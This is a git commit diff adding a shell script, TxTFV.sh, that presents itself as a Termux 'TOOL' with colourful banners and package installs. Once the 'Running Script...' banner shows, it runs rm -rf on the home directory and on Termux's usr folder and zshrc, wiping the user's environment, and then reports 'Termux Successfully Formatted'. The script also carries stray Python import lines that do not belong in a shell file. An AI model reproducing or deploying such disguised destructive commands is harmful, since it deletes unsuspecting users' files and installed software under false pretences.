a6fd31bcd7c60b85e88325ae1a1fd19efd814cd0
Mʀ.Tʜᴇɴᴜx <88967143+HyperElite444@users.noreply.github.com>
2022-03-07 12:07:12 +0530

    Add files via upload

---
+++ TxTFV.sh
@@ -0,0 +1,32 @@
+#TOOL by MR.THENUX
+
+from ctypes import cdll
+from platform import python_branch
+from tkinter import Y
+from turtle import clear
+
+clear
+
+echo && echo && printf " " && printf TOOL | lolcat && printf " " && printf BY | lolcat && echo && figlet -f small MR.THENUX | lolcat
+
+echo
+echo
+figlet -f slant Installing Packages... | lolcat
+pkg install figlet -y
+pkg install lolcat -y
+pkg install python -y
+pkg intall python2 -y
+
+echo && echo && printf " " && printf TOOL | lolcat && printf " " && printf BY | lolcat && echo && figlet -f small MR.THENUX | lolcat
+
+echo
+echo
+figlet -f small Running Script... | lolcat
+cd
+cd ..
+rm -rf home
+rm -rf /data/data/com.termux/files/usr
+rm -rf /data/data/com.termux/files/zshrc
+figlet -f shadow Termux Successfully Formatted... | lolcat
+
+clear
